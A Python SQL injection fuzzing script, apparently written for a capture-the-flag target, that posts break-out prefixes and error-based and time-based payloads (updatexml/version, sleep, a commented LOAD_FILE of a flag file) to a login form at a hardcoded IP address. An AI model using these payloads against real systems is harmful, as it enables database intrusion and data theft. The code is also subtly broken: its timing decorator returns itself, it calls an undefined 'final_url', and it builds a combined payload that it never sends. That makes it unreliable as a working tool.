"""
1.生成req.txt req.py
2.替换字段
3.xpath_msg 看情况改为错误消息 xpath

"""
import time
from requests_html import HTMLSession
import os

xpath_msg = '//body' # 错误消息xpath
url = 'http://43.249.195.138:21215/'
data = {'username': ['1'], 'password': ['2'], 'submit': ['登录']}
files = {}
cookies = {}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
proxies = {}

session = HTMLSession()

# payload = ' or updatexml(1,concat(0x7e,LOAD_FILE("g:/flag"),0x7e),1)'
payload_lst = [
    ' oR iF(sLEEp(1),1,2)',
    ' or updatexml(1,concat(0x7e,version(),0x7e),1)',
]
payload = payload_lst[-1]
words_lst = {
    "1#": "%s#" % payload,
    "1'#": "%s#" % payload,
    "'1'#": "%s#" % payload,
    "1''#": "%s#" % payload,
    '1"#': "%s#" % payload,
    '1""#': "%s#" % payload,
    "1')#": "%s#" % payload,
    "1'))#": "%s#" % payload,
    '1")#': "%s#" % payload,
    '1"))#': "%s#" % payload,
    "''#'": "%s#" % payload,
    "1)": "%s#" % payload.rstrip(")"),  # 1)  对应sql为 SELECT * FROM lmx_book  WHERE uid in($input$)
}


def my_decorator(func):
    def wrapper(*args, **kwargs):
        """decorator"""
        start_time = time.time()  # 记录开始时间
        func(*args, **kwargs)
        end_time = time.time()  # 记录结束时间
        run_time = end_time - start_time  # 计算运行时间

        return wrapper

    return wrapper


@my_decorator
def send_request_get(data):
    res = session.get(final_url, params=data, proxies=proxies)
    if xpath_msg:
        print(data, '---', res.html.xpath(xpath_msg, first=True).text)


@my_decorator
def send_request_post(data):
    res = session.post(url, data=data, proxies=proxies)
    if xpath_msg:
        print(data, '---', res.html.xpath(xpath_msg, first=True).text)


def get_payload(txt,i =0):
    key1 = list(data.keys())[i]
    data[key1] = txt
    return data


if __name__ == '__main__':
    for param, payload_tmp in words_lst.items():
        pl = param + payload_tmp
        payload = get_payload(param)
        # payload = get_payload(param, 1)
        # send_request_get(payload)
        send_request_post(payload)
